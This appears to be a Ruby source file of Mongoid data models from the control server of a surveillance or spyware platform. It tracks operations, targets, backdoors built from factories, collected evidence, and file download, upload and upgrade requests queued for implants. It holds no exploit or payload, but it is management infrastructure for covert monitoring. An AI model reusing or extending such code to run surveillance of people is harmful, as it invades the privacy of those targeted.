require 'mongoid'

class Item
  include Mongoid::Document
  include Mongoid::Timestamps

  # common
  field :name, type: String
  field :desc, type: String
  field :status, type: String
  field :_kind, type: String
  field :path, type: Array

  # operation
  field :contact, type: String

  # factory
  field :ident, type: String
  field :counter, type: Integer
  field :seed, type: String
  field :confkey, type: String
  field :logkey, type: String

  # backdoor (+ factory fields)
  field :instance, type: String
  field :version, type: Integer
  field :type, type: String
  field :platform, type: String
  field :deleted, type: Boolean
  field :uninstalled, type: Boolean
  field :demo, type: Boolean
  field :upgradable, type: Boolean

  scope :operations, where(_kind: "operation")
  scope :targets, where(_kind: "target")
  scope :backdoors, where(_kind: "backdoor")
  scope :factories, where(_kind: "factory")

  has_and_belongs_to_many :groups, :dependent => :nullify, :autosave => true

  embeds_many :filesystem_requests, class_name: "FilesystemRequest"
  embeds_many :download_requests, class_name: "DownloadRequest"
  embeds_many :upgrade_requests, class_name: "UpgradeRequest"
  embeds_many :upload_requests, class_name: "UploadRequest"
  
  embeds_one :stat

  embeds_many :configs, class_name: "Configuration"

  store_in :items

  after_destroy :destroy_callback

  public
  
  # performs global recalculation of stats (to be called periodically)
  def self.restat
    # to make stat converge in one step, first restat targets, then operations
    Item.where(_kind: 'target').each {|i| i.restat}
    Item.where(_kind: 'operation').each {|i| i.restat}
  end
  
  def restat
    case self._kind
      when 'operation'
        self.stat.size = 0; self.stat.grid_size = 0; self.stat.evidence = {}
        targets = Item.where(_kind: 'target').also_in(path: [self._id])
        targets.each do |t|
          self.stat.evidence.merge!(t.stat.evidence) {|k,o,n| o+n }
          self.stat.size += t.stat.size
          self.stat.grid_size += t.stat.grid_size
        end
        self.save
      when 'target'
        self.stat.grid_size = 0; self.stat.evidence = {}
        backdoors = Item.where(_kind: 'backdoor').also_in(path: [self._id])
        backdoors.each do |b|
          self.stat.evidence.merge!(b.stat.evidence) {|k,o,n| o+n }
          self.stat.grid_size += b.stat.grid_size
        end
        db = Mongoid.database
        collection = db.collections.select {|c| c.name == Evidence.collection_name(self._id.to_s)}
        unless collection.empty?
          self.stat.size = collection.first.stats()['size'].to_i
          self.save
        end
    end
  end


  def clone_instance
    return nil if self[:_kind] != 'factory'

    backdoor = Item.new
    backdoor._kind = 'backdoor'
    backdoor.deleted = false
    backdoor.ident = self[:ident]
    backdoor.name = self[:ident] + " (#{self[:counter]})"
    backdoor.type = self[:type]
    backdoor.desc = self[:desc]
    backdoor[:path] = self[:path]
    backdoor.confkey = self[:confkey]
    backdoor.logkey = self[:logkey]
    backdoor.pathseed = self[:pathseed]

    # clone the factory's config
    fc = self[:configs].first

    nc = ::Configuration.new
    nc.user = fc['user']
    nc.desc = fc['desc']
    nc.config = fc['config']
    nc.saved = Time.now.getutc.to_i

    backdoor.configs = [ nc ]

    ns = ::Stat.new
    ns.evidence = {}
    ns.size = 0
    ns.grid_size = 0

    backdoor.stat = ns

    return backdoor
  end

  protected
  
  def destroy_callback
    case self._kind
      when 'operation'
        # destroy all the targets of this operation
        Item.where({_kind: 'target', path: [ self._id ]}).each {|targ| targ.destroy}
      when 'target'
        # destroy all the backdoors of this target
        Item.where({_kind: 'backdoor'}).also_in({path: [ self._id ]}).each {|bck| bck.destroy}
        # drop the collection
        Mongoid.database.drop_collection Evidence.collection_name(self._id.to_s)
      when 'backdoor'
        # destroy all the evidences
        Evidence.collection_class(self.path.last).where(item: self._id).each {|ev| ev.destroy}
        # drop all grid items
        GridFS.instance.delete_by_backdoor(self._id.to_s)
    end
  end
end

class FilesystemRequest
  include Mongoid::Document
  
  field :path, type: String
  field :depth, type: Integer
  
  validates_uniqueness_of :path

  embedded_in :item
end

class DownloadRequest
  include Mongoid::Document

  field :path, type: String

  validates_uniqueness_of :path

  embedded_in :item
end

class UpgradeRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array

  validates_uniqueness_of :filename

  embedded_in :item
end

class UploadRequest
  include Mongoid::Document
  
  field :filename, type: String
  field :_grid, type: Array
  
  validates_uniqueness_of :filename
  
  embedded_in :item
end

class Stat
  include Mongoid::Document

  field :source, type: String
  field :user, type: String
  field :device, type: String
  field :last_sync, type: Integer
  field :size, type: Integer, :default => 0
  field :grid_size, type: Integer, :default => 0
  field :evidence, type: Hash, :default => {}
  
  embedded_in :item
end
